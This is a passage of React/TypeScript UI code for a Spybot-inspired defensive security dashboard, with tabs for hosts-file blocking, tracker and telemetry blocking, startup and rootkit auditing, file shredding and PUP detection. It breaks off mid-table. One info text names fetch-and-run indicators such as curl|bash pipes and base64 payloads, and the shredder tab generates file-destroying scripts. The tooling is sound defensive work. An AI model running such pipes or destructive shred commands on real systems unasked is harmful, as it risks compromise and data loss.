// ── 9. HOSTS FILE IMMUNIZER (Spybot) ─────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function HostsImmTab() {
  const { data, reload } = useFwm<{ entries:Array<{id:number;domain:string;category:string;source:string|null;redirectTo:string;enabled:boolean;hitCount:number;addedAt:string}>;total:number;byCategory:Record<string,number> }>("/hosts/entries");
  const [form, setForm] = useState({ domain:"", category:"malware", source:"custom", redirectTo:"0.0.0.0" });
  const [search, setSearch] = useState("");
  const exportHosts = async () => { const r = await fetch(`${APIFWM}/hosts/export`); const t = await r.text(); const b=new Blob([t],{type:"text/plain"}); const a=document.createElement("a"); a.href=URL.createObjectURL(b); a.download="proxhq-hosts"; a.click(); };
  const CAT_C: Record<string,string> = { malware:"#ff4444", tracking:"#ff9900", ads:"#ffaa00", phishing:"#ff6600", telemetry:"#4488ff", c2:"#cc44ff" };
  const filtered = (data?.entries??[]).filter(e => !search || e.domain.includes(search));
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Server size={14} color="#ff9900"/>} title="Hosts File Immunizer — Spybot S&amp;D" badge="Spybot Technique" badgeColor="#ff9900" extra={<div style={{display:"flex",gap:6}}><Btn2 onClick={async()=>{await fwmPost("/hosts/seed",{}); await reload();}} color="#4488ff" sm>Seed Defaults</Btn2><Btn2 onClick={exportHosts} color="#00ff88" sm>Export /etc/hosts</Btn2></div>}/>
        <InfoBar text="Spybot-S&D immunization technique (2000): Map malicious domains to 0.0.0.0 in /etc/hosts to block them system-wide before DNS resolution. No DNS server needed — works at OS level for all applications. Covers: malware C2, tracking pixels, ad networks, phishing, telemetry, cryptomining." color="#ff9900"/>
        <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
          {Object.entries(data?.byCategory??{}).map(([cat,n])=>(
            <div key={cat} style={{ background:`${CAT_C[cat]??'#888'}22`, border:`1px solid ${CAT_C[cat]??'#888'}44`, borderRadius:6, padding:"3px 10px", fontFamily:"monospace", fontSize:10, color:CAT_C[cat]??"#888" }}>{cat}: {n as number}</div>
          ))}
          <div style={{ marginLeft:"auto", fontFamily:"monospace", fontSize:11, color:"#555" }}>Total: {data?.total??0} entries</div>
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Plus size={12} color="#00ff88"/>} title="Immunize Domain"/>
        <div style={{ display:"flex", flexDirection:"column", gap:6, marginBottom:8 }}>
          <input value={form.domain} onChange={e=>setForm(p=>({...p,domain:e.target.value}))} placeholder="malicious-domain.com" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <div style={{ display:"flex", gap:6 }}>
            <select value={form.category} onChange={e=>setForm(p=>({...p,category:e.target.value}))} style={{ flex:1, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
              {["malware","tracking","ads","phishing","telemetry","c2","cryptomining"].map(c=><option key={c}>{c}</option>)}
            </select>
            <input value={form.redirectTo} onChange={e=>setForm(p=>({...p,redirectTo:e.target.value}))} placeholder="0.0.0.0" style={{ width:100, background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 8px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          </div>
          <Btn2 onClick={async()=>{ await fwmPost("/hosts/add",form); await reload(); setForm(p=>({...p,domain:""})); }} color="#00ff88" sm disabled={!form.domain}>Block Domain</Btn2>
        </div>
        <div style={{ background:"#050f05", border:"1px solid #00ff8822", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:9, color:"#555" }}>
          Preview: <span style={{ color:"#ffaa00" }}>{form.redirectTo} {form.domain || "<domain>"}</span>  # {form.category}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#ff9900"/>} title={`Blocked Domains (${data?.total??0})`}/>
        <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search domains..." style={{ width:"100%", background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"5px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc", boxSizing:"border-box", marginBottom:8 }}/>
        <div style={{ maxHeight:280, overflow:"auto" }}>
          {filtered.slice(0,50).map(e=>(
            <div key={e.id} style={{ display:"flex", alignItems:"center", justifyContent:"space-between", padding:"3px 0", borderBottom:"1px solid #0f0f0f" }}>
              <div>
                <span style={{ fontFamily:"monospace", fontSize:10, color:"#ccc" }}>{e.domain}</span>
                <Bdg label={e.category} color={CAT_C[e.category]??"#888"} sm/>
              </div>
              <Btn2 onClick={async()=>{ await fwmDelete(`/hosts/${e.id}`); await reload(); }} color="#ff4444" sm><Trash2 size={8}/></Btn2>
            </div>
          ))}
        </div>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 10. TRACKING DOMAIN BLOCKER ──────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function TrackingTab() {
  const { data, reload } = useFwm<{ domains:Array<{id:number;domain:string;vendor:string|null;category:string;cookieName:string|null;blocked:boolean;hitCount:number}>;total:number;blocked:number;byVendor:Record<string,number> }>("/tracking/domains");
  const VENDOR_C: Record<string,string> = { Google:"#4488ff", Meta:"#1877F2", Twitter:"#1DA1F2", LinkedIn:"#0077B5", Hotjar:"#ff9900", FullStory:"#ff6600", Smartlook:"#cc44ff", Microsoft:"#00a4ef", Amazon:"#ff9900", Criteo:"#ff4444", FingerprintJS:"#ff2244" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Radio size={14} color="#ff9900"/>} title="Tracking Domain Blocker — Spybot S&amp;D" badge="Privacy Protection" badgeColor="#ff9900" extra={<Btn2 onClick={async()=>{await fwmPost("/tracking/seed",{}); await reload();}} color="#4488ff" sm>Seed Trackers</Btn2>}/>
        <InfoBar text="Spybot-S&D tracking cookie protection: block known analytics, pixel tracking, session replay, ad network, and browser fingerprinting domains. Covers: Google Analytics, Meta Pixel, Hotjar session replay, FullStory, FingerprintJS, Criteo retargeting, Amazon DSP, Twitter/LinkedIn pixels." color="#ff9900"/>
        <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
          {Object.entries(data?.byVendor??{}).slice(0,8).map(([v,n])=>(
            <div key={v} style={{ background:`${VENDOR_C[v]??'#888'}22`, border:`1px solid ${VENDOR_C[v]??'#888'}44`, borderRadius:6, padding:"3px 10px", fontFamily:"monospace", fontSize:10, color:VENDOR_C[v]??"#888" }}>{v}: {n as number}</div>
          ))}
          <div style={{ marginLeft:"auto", fontSize:11, fontFamily:"monospace", color:"#555" }}>{data?.blocked??0}/{data?.total??0} blocked</div>
        </div>
      </FwmCard>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Domain","Vendor","Category","Cookie","Blocked","Hits"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 8px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.domains??[]).map(d=>(
            <tr key={d.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#ccc"}}>{d.domain}</td>
              <td style={{padding:"4px 8px"}}><span style={{color:VENDOR_C[d.vendor??'']??"#888",fontFamily:"monospace",fontSize:10}}>{d.vendor}</span></td>
              <td style={{padding:"4px 8px",color:"#555"}}>{d.category.replace(/_/g," ")}</td>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#666",fontSize:9}}>{d.cookieName}</td>
              <td style={{padding:"4px 8px"}}><Bdg label={d.blocked?"BLOCKED":"ALLOW"} color={d.blocked?"#ff4444":"#00ff88"} sm/></td>
              <td style={{padding:"4px 8px",color:"#555",fontFamily:"monospace"}}>{d.hitCount}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 11. ANTI-TELEMETRY FIREWALL ───────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function TelemetryTab() {
  const { data, reload } = useFwm<{ rules:Array<{id:number;domain:string|null;ipRange:string|null;vendor:string;service:string|null;blocked:boolean;hitCount:number}>;total:number;blocked:number }>("/anti-telemetry/rules");
  const downloadScript = async () => { const r = await fetch(`${APIFWM}/anti-telemetry/script`); const t = await r.text(); const b=new Blob([t],{type:"text/plain"}); const a=document.createElement("a"); a.href=URL.createObjectURL(b); a.download="anti-telemetry.sh"; a.click(); };
  const VENDOR_C: Record<string,string> = { microsoft:"#00a4ef", google:"#4488ff", apple:"#aaa", amazon:"#ff9900", meta:"#1877F2", samsung:"#ff6600", adobe:"#ff4444", mozilla:"#ff6611", valve:"#171a21", sony:"#003087" };
  const byVendor: Record<string,number> = {};
  for (const r of data?.rules??[]) byVendor[r.vendor] = (byVendor[r.vendor]??0) + 1;
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Radio size={14} color="#00a4ef"/>} title="Anti-Telemetry Firewall — Spybot Anti-Beacon" badge="Anti-Beacon" badgeColor="#00a4ef" extra={<div style={{display:"flex",gap:6}}><Btn2 onClick={async()=>{await fwmPost("/anti-telemetry/seed",{}); await reload();}} color="#4488ff" sm>Seed Rules</Btn2><Btn2 onClick={downloadScript} color="#00ff88" sm>Download .sh Script</Btn2></div>}/>
        <InfoBar text="Spybot Anti-Beacon: block OS and app telemetry without your knowledge. Microsoft Windows telemetry, Cortana, Windows Error Reporting, Bing. Google Chrome crash reports, analytics. Apple metrics. Amazon Alexa, Fire TV. Samsung SmartTV analytics. Generates iptables rules + /etc/hosts entries." color="#00a4ef"/>
        <div style={{ display:"flex", gap:6, flexWrap:"wrap" }}>
          {Object.entries(byVendor).map(([v,n])=>(
            <div key={v} style={{ background:`${VENDOR_C[v]??'#888'}22`, border:`1px solid ${VENDOR_C[v]??'#888'}44`, borderRadius:6, padding:"3px 10px", fontFamily:"monospace", fontSize:10, color:VENDOR_C[v]??"#888", textTransform:"capitalize" }}>{v}: {n as number}</div>
          ))}
          <div style={{ marginLeft:"auto", fontSize:11, fontFamily:"monospace", color:"#555" }}>{data?.blocked??0}/{data?.total??0} blocked</div>
        </div>
      </FwmCard>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Vendor","Service","Domain","IP Range","Status","Hits"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 8px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.rules??[]).map(r=>(
            <tr key={r.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"4px 8px"}}><span style={{color:VENDOR_C[r.vendor]??"#888",fontFamily:"monospace",textTransform:"capitalize"}}>{r.vendor}</span></td>
              <td style={{padding:"4px 8px",color:"#aaa",fontSize:9}}>{r.service}</td>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#ccc",fontSize:9}}>{r.domain}</td>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#555",fontSize:9}}>{r.ipRange}</td>
              <td style={{padding:"4px 8px"}}><Bdg label={r.blocked?"BLOCKED":"ALLOW"} color={r.blocked?"#ff4444":"#00ff88"} sm/></td>
              <td style={{padding:"4px 8px",color:"#555",fontFamily:"monospace"}}>{r.hitCount}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 12. STARTUP PROCESS AUDITOR ──────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function StartupTab() {
  const { data, reload } = useFwm<{ entries:Array<{id:number;name:string;command:string;location:string;enabled:boolean;risk:string;riskReason:string|null;hash:string|null;signature:string|null;scannedAt:string}>;liveEntries:string[];total:number;suspicious:number }>("/startup/entries");
  const RISK_C: Record<string,string> = { clean:"#00ff88", suspicious:"#ffaa00", malicious:"#ff4444", unknown:"#555" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Monitor size={14} color="#ff9900"/>} title="Startup Process Auditor — Spybot S&amp;D" badge="Spybot Startup Tools" badgeColor="#ff9900" extra={<div style={{display:"flex",gap:6}}><Btn2 onClick={async()=>{await fwmPost("/startup/scan",{}); await reload();}} color="#ff9900" sm>Scan Live</Btn2><Btn2 onClick={async()=>{await fwmPost("/startup/seed",{}); await reload();}} color="#4488ff" sm>Seed Examples</Btn2></div>}/>
        <InfoBar text="Spybot Startup Tools: audit all autorun points — systemd units, crontab, /etc/init.d/, rc.local, Windows HKLM\...\Run. Detect cryptominers, droppers, keyloggers, and base64-obfuscated payloads hiding in auto-start locations. Suspicious indicators: /tmp execution, curl|bash pipes, base64 payloads, unsigned binaries." color="#ff9900"/>
        <div style={{ display:"grid", gridTemplateColumns:"repeat(4,1fr)", gap:10 }}>
          {[{l:"Total Entries",v:data?.total??0,c:"#fff"},{l:"Suspicious",v:data?.suspicious??0,c:"#ffaa00"},{l:"Malicious",v:(data?.entries??[]).filter(e=>e.risk==="malicious").length,c:"#ff4444"},{l:"Clean",v:(data?.entries??[]).filter(e=>e.risk==="clean").length,c:"#00ff88"}].map(s=>(
            <div key={s.l} style={{ textAlign:"center", background:"#111", borderRadius:6, padding:"10px 6px" }}>
              <div style={{ fontSize:20, fontWeight:700, color:s.c, fontFamily:"monospace" }}>{s.v}</div>
              <div style={{ fontSize:10, color:"#555" }}>{s.l}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Name","Location","Command","Signature","Risk","Reason"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 8px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.entries??[]).map(e=>(
            <tr key={e.id} style={{ borderBottom:"1px solid #0f0f0f", background:e.risk==="malicious"?"#0f050500":e.risk==="suspicious"?"#0a050000":"transparent" }}>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#fff"}}>{e.name}</td>
              <td style={{padding:"4px 8px",color:"#4488ff",fontSize:9}}>{e.location}</td>
              <td style={{padding:"4px 8px",fontFamily:"monospace",color:"#555",fontSize:8,maxWidth:200,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{e.command}</td>
              <td style={{padding:"4px 8px"}}><Bdg label={e.signature??"unknown"} color={e.signature==="verified"?"#00ff88":"#ff4444"} sm/></td>
              <td style={{padding:"4px 8px"}}><Bdg label={e.risk.toUpperCase()} color={RISK_C[e.risk]??"#888"} sm/></td>
              <td style={{padding:"4px 8px",color:"#555",fontSize:9}}>{(e.riskReason??"").slice(0,50)}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 13. ROOTKIT SCANNER (Spybot RootAlyzer) ──────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function RootkitTab() {
  const { data: scansData, reload } = useFwm<{ scans:Array<{id:number;scanType:string;totalChecks:number;findings:number;criticalCount:number;status:string;startedAt:string;completedAt:string|null}> }>("/rootkit/scans");
  const [scanning, setScanning] = useState(false);
  const [latestFindings, setLatestFindings] = useState<Array<{id:number;type:string;description:string;location:string|null;severity:string}>|null>(null);
  const [scanType, setScanType] = useState<"full"|"quick"|"memory"|"network">("full");
  const runScan = async () => {
    setScanning(true);
    const r = await fwmPost("/rootkit/scan", { scanType });
    setLatestFindings(r.findings);
    setScanning(false);
    await reload();
  };
  const SEV_C2: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#aaccff", clean:"#00ff88" };
  const TYPE_C: Record<string,string> = { hidden_process:"#ff4444", hidden_port:"#ff6600", hidden_file:"#ffaa00", kernel_module:"#cc44ff", ld_preload:"#ff2244", hooks:"#ff9900" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Bug size={14} color="#ff4444"/>} title="Rootkit Scanner — Spybot RootAlyzer" badge="Real /proc Inspection" badgeColor="#ff4444" extra={<Btn2 onClick={async()=>{await fwmPost("/rootkit/seed",{}); await reload();}} color="#4488ff" sm>Seed Example</Btn2>}/>
        <InfoBar text="RootAlyzer-inspired deep scan: compare /proc PIDs vs ps output (hidden process detection), /proc/net/tcp vs ss ports (hidden port detection), LD_PRELOAD hooks (/etc/ld.so.preload), suspicious kernel modules, executable files in /tmp. All checks use real /proc filesystem data." color="#ff4444"/>
        <div style={{ display:"flex", gap:8, alignItems:"center" }}>
          {(["full","quick","memory","network"] as const).map(t=>(
            <button key={t} onClick={()=>setScanType(t)} style={{ background:scanType===t?"#ff444422":"#111", border:`1px solid ${scanType===t?"#ff444444":"#2a2a2a"}`, borderRadius:6, padding:"5px 12px", fontFamily:"monospace", fontSize:10, color:scanType===t?"#ff4444":"#555", cursor:"pointer" }}>{t.toUpperCase()}</button>
          ))}
          <Btn2 onClick={runScan} disabled={scanning} color="#ff4444">{scanning?"Scanning /proc...":"Run Rootkit Scan"}</Btn2>
        </div>
      </FwmCard>
      {latestFindings !== null && (
        <FwmCard style={{ gridColumn:"1/-1" }}>
          <SectionTitle icon={<AlertTriangle size={12} color={latestFindings.length===0?"#00ff88":"#ff4444"}/>} title={latestFindings.length===0?"✅ No Rootkit Artifacts Detected":`⚠️ ${latestFindings.length} Finding(s) Detected`}/>
          {latestFindings.map(f=>(
            <div key={f.id} style={{ background:"#0f0505", border:"1px solid #ff444422", borderRadius:6, padding:10, marginBottom:8 }}>
              <div style={{ display:"flex", justifyContent:"space-between", marginBottom:4 }}>
                <span style={{ fontFamily:"monospace", fontSize:11, color:TYPE_C[f.type]??"#ff9900" }}>{f.type.replace(/_/g," ").toUpperCase()}</span>
                <Bdg label={f.severity.toUpperCase()} color={SEV_C2[f.severity]??"#888"} sm/>
              </div>
              <div style={{ fontSize:10, color:"#aaa" }}>{f.description}</div>
              {f.location && <div style={{ fontSize:9, color:"#555", fontFamily:"monospace", marginTop:4 }}>Location: {f.location}</div>}
            </div>
          ))}
        </FwmCard>
      )}
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Activity size={12} color="#ff4444"/>} title="Scan History"/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Type","Status","Checks","Findings","Critical","Started"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"4px 8px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
          <tbody>{(scansData?.scans??[]).map(s=>(
            <tr key={s.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"4px 8px",color:"#aaa",fontFamily:"monospace"}}>{s.scanType}</td>
              <td style={{padding:"4px 8px"}}><Bdg label={s.status.toUpperCase()} color={s.status==="complete"?"#00ff88":"#ffaa00"} sm/></td>
              <td style={{padding:"4px 8px",color:"#555"}}>{s.totalChecks}</td>
              <td style={{padding:"4px 8px",color:s.findings>0?"#ff6600":"#00ff88",fontFamily:"monospace"}}>{s.findings}</td>
              <td style={{padding:"4px 8px",color:s.criticalCount>0?"#ff2244":"#555",fontFamily:"monospace"}}>{s.criticalCount}</td>
              <td style={{padding:"4px 8px",color:"#555",fontSize:9}}>{new Date(s.startedAt).toLocaleString()}</td>
            </tr>
          ))}</tbody>
        </table>
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 14. SECURE FILE SHREDDER ──────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function ShredderTab() {
  const { data: jobs, reload } = useFwm<{ jobs:Array<{id:number;path:string;method:string;passes:number;fileSizeBytes:number|null;status:string;script:string|null;startedAt:string}> }>("/shredder/jobs");
  const { data: methods } = useFwm<{ methods:Array<{id:string;passes:number;description:string;standard:string}> }>("/shredder/methods");
  const [form, setForm] = useState({ path:"", method:"dod_5220", recursive:false });
  const [script, setScript] = useState<string|null>(null);
  const generate = async () => { const r = await fwmPost("/shredder/generate",form); setScript(r.script); await reload(); };
  const METHOD_C: Record<string,string> = { dod_5220:"#ff9900", gutmann:"#ff4444", nist_800_88:"#4488ff", random_1pass:"#555", zeros_1pass:"#555", prng_3pass:"#ffaa00" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<FileX size={14} color="#ff6600"/>} title="Secure File Shredder — DoD 5220.22-M / Gutmann" badge="Spybot Shredder" badgeColor="#ff6600"/>
        <InfoBar text="Spybot Secure Shredder: multi-pass file deletion that defeats forensic recovery tools. DoD 5220.22-M (3-pass: 0x00, 0xFF, random) — US Department of Defense standard. Gutmann (35-pass) — Peter Gutmann 1996. NIST SP 800-88 (single pass, sufficient for SSDs). Generates runnable shell scripts." color="#ff6600"/>
        <div style={{ display:"flex", gap:8, flexWrap:"wrap" }}>
          {(methods?.methods??[]).map(m=>(
            <div key={m.id} style={{ background:`${METHOD_C[m.id]??'#888'}22`, border:`1px solid ${METHOD_C[m.id]??'#888'}44`, borderRadius:6, padding:"5px 12px" }}>
              <div style={{ fontFamily:"monospace", fontSize:10, color:METHOD_C[m.id]??"#888" }}>{m.id.replace(/_/g," ").toUpperCase()}</div>
              <div style={{ fontSize:9, color:"#555" }}>{m.passes} pass(es) · {m.standard}</div>
            </div>
          ))}
        </div>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<FileX size={12} color="#ff6600"/>} title="Generate Shred Script"/>
        <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:10 }}>
          <input value={form.path} onChange={e=>setForm(p=>({...p,path:e.target.value}))} placeholder="/path/to/sensitive-file.txt" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <select value={form.method} onChange={e=>setForm(p=>({...p,method:e.target.value}))} style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}>
            {(methods?.methods??[]).map(m=><option key={m.id} value={m.id}>{m.id.replace(/_/g," ").toUpperCase()} — {m.description}</option>)}
          </select>
          <label style={{ display:"flex", gap:8, alignItems:"center", fontSize:10, color:"#aaa", cursor:"pointer" }}>
            <input type="checkbox" checked={form.recursive} onChange={e=>setForm(p=>({...p,recursive:e.target.checked}))}/>
            Recursive (shred entire directory)
          </label>
          <Btn2 onClick={generate} color="#ff6600" disabled={!form.path}>Generate Script</Btn2>
        </div>
        {script && (
          <div>
            <textarea value={script} readOnly style={{ width:"100%", background:"#050505", border:"1px solid #ff660022", borderRadius:6, padding:8, fontFamily:"monospace", fontSize:8, color:"#aaa", minHeight:200, boxSizing:"border-box", resize:"vertical" }}/>
            <Btn2 onClick={()=>{ const b=new Blob([script],{type:"text/plain"}); const a=document.createElement("a"); a.href=URL.createObjectURL(b); a.download="shred.sh"; a.click(); }} color="#00ff88" sm>Download shred.sh</Btn2>
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Activity size={12} color="#ff6600"/>} title="Shredder Job History"/>
        {(jobs?.jobs??[]).length===0 ? <div style={{color:"#444",fontFamily:"monospace",fontSize:11}}>No jobs yet — generate a script above</div> : (
          <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
            <thead><tr>{["Path","Method","Passes","Status","Date"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px",fontFamily:"monospace"}}>{h}</th>)}</tr></thead>
            <tbody>{(jobs?.jobs??[]).map(j=>(
              <tr key={j.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
                <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#ccc",fontSize:9,maxWidth:160,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{j.path}</td>
                <td style={{padding:"3px 6px"}}><Bdg label={j.method.replace(/_/g," ")} color={METHOD_C[j.method]??"#888"} sm/></td>
                <td style={{padding:"3px 6px",color:"#555",fontFamily:"monospace"}}>{j.passes}</td>
                <td style={{padding:"3px 6px"}}><Bdg label={j.status.toUpperCase()} color={j.status==="complete"?"#00ff88":"#ffaa00"} sm/></td>
                <td style={{padding:"3px 6px",color:"#555",fontSize:9}}>{new Date(j.startedAt).toLocaleDateString()}</td>
              </tr>
            ))}</tbody>
          </table>
        )}
      </FwmCard>
    </div>
  );
}

// ════════════════════════════════════════════════════════════════════════════
// ── 15. PUP / ADWARE DATABASE ─────────────────────────────────────────────────
// ════════════════════════════════════════════════════════════════════════════
function PupTab() {
  const { data, reload } = useFwm<{ sigs:Array<{id:number;name:string;category:string;description:string|null;risk:string;detections:number;lastSeen:string|null}>;total:number }>("/pup/signatures");
  const [scanForm, setScanForm] = useState({ processName:"", domain:"", filePath:"" });
  const [scanResult, setScanResult] = useState<{matches:Array<{sig:{name:string;category:string;risk:string};matchedOn:string;value:string|undefined}>;detected:boolean;recommendation:string}|null>(null);
  const RISK_C: Record<string,string> = { critical:"#ff2244", high:"#ff6600", medium:"#ffaa00", low:"#4488ff" };
  const CAT_C: Record<string,string> = { adware:"#ffaa00", pup:"#ff9900", spyware:"#ff4444", browser_hijacker:"#ff6600", rogue_av:"#ff2244", toolbar:"#888", crypto_miner:"#cc44ff" };
  return (
    <div style={{ display:"grid", gridTemplateColumns:"1fr 1fr", gap:14 }}>
      <FwmCard style={{ gridColumn:"1/-1" }}>
        <SectionTitle icon={<Package size={14} color="#ffaa00"/>} title="PUP / Adware Signature Database — Spybot S&amp;D" badge="Spybot Signatures" badgeColor="#ffaa00" extra={<Btn2 onClick={async()=>{await fwmPost("/pup/seed",{}); await reload();}} color="#4488ff" sm>Seed Database</Btn2>}/>
        <InfoBar text="Spybot PUP detection: Potentially Unwanted Programs that evade traditional AV. Includes: browser toolbars (Conduit, Ask), browser hijackers, cryptominers (XMRig disguised), spyware (BonziBuddy), fake AV (Rogue AV), adware. Detection by process name, domain, file path, registry key." color="#ffaa00"/>
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Search size={12} color="#ffaa00"/>} title="PUP Scanner"/>
        <div style={{ display:"flex", flexDirection:"column", gap:8, marginBottom:8 }}>
          <input value={scanForm.processName} onChange={e=>setScanForm(p=>({...p,processName:e.target.value}))} placeholder="Process name (e.g. SearchProtect.exe)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={scanForm.domain} onChange={e=>setScanForm(p=>({...p,domain:e.target.value}))} placeholder="Domain (e.g. conduit.com)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <input value={scanForm.filePath} onChange={e=>setScanForm(p=>({...p,filePath:e.target.value}))} placeholder="File path (e.g. C:\ConduitEngine\)" style={{ background:"#111", border:"1px solid #2a2a2a", borderRadius:6, padding:"6px 10px", fontFamily:"monospace", fontSize:10, color:"#ccc" }}/>
          <Btn2 onClick={async()=>{ const r = await fwmPost("/pup/scan",scanForm); setScanResult(r); }} color="#ffaa00">Scan for PUPs</Btn2>
        </div>
        {scanResult && (
          <div style={{ background: scanResult.detected?"#0f0500":"#050f05", border:`1px solid ${scanResult.detected?"#ff660033":"#00ff8833"}`, borderRadius:6, padding:10 }}>
            <div style={{ fontSize:13, fontWeight:700, fontFamily:"monospace", color:scanResult.detected?"#ff6600":"#00ff88", marginBottom:6 }}>{scanResult.detected?"⚠️ PUP DETECTED":"✅ Clean"}</div>
            {scanResult.matches.map((m,i)=>(
              <div key={i} style={{ display:"flex", gap:8, marginBottom:4 }}>
                <Bdg label={m.sig.name} color={RISK_C[m.sig.risk]??"#888"} sm/><span style={{color:"#555",fontSize:10}}>via {m.matchedOn}</span>
              </div>
            ))}
            <div style={{ fontSize:10, color:"#aaa", marginTop:6 }}>{scanResult.recommendation}</div>
          </div>
        )}
      </FwmCard>
      <FwmCard>
        <SectionTitle icon={<Package size={12} color="#ffaa00"/>} title={`Signature Database (${data?.total??0})`}/>
        <table style={{ width:"100%", borderCollapse:"collapse", fontSize:10 }}>
          <thead><tr>{["Name","Category","Risk","Detections"].map(h=><th key={h} style={{textAlign:"left",color:"#444",borderBottom:"1px solid #1a1a1a",padding:"3px 6px"}}>{h}</th>)}</tr></thead>
          <tbody>{(data?.sigs??[]).map(s=>(
            <tr key={s.id} style={{ borderBottom:"1px solid #0f0f0f" }}>
              <td style={{padding:"3px 6px",fontFamily:"monospace",color:"#ccc"}}>{s.name}</td>
              <td style={{padding:"3px 6px"}}><Bdg label={s.category.replace(/_/g," ")} color={CAT_C[s.category]??"#888"} sm/></td>
              <td style={{padding:"3px 6px"}}><Bdg label={s.risk.toUpperCase()} color={RISK_C[s.risk]??"#888"} sm/></td>
